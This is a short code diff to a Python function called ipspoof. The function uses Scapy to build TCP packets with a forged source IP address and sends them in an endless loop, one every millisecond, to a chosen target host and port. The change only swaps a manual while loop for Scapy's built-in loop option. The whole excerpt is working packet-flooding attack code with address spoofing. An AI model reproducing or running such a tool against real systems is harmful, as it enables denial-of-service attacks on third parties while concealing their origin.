@@ -27,16 +27,15 @@ def ipspoof(source_ip, source_port, target_ip, target_port):
         choice = input(f'[{Fore.GREEN}+{Style.RESET_ALL}] Source IP: {Fore.GREEN}{src_ip}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Source port: {Fore.GREEN}{src_port}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target IP: {Fore.GREEN}{tgt_ip}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target port: {Fore.GREEN}{tgt_port}{Style.RESET_ALL}\nDo you wish to continue? [Y/N]: ')
 
         if choice.lower() == 'y':
-            i=1
 
             IP1 = IP(src=src_ip, dst=tgt_ip)
             TCP1 = TCP(sport=src_port, dport=tgt_port)
             pkt = IP1 / TCP1
 
             print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Sending packets to {Fore.YELLOW}{target_ip}{Style.RESET_ALL} on port {Fore.YELLOW}{target_port}{Style.RESET_ALL}...')
-            while True:
-                send(pkt, inter= .001, verbose=0)
-                i=i+1
+            
+            send(pkt, loop=1, inter= .001, verbose=0)
+        
 
         else:
             print('Operation was cancelled.')
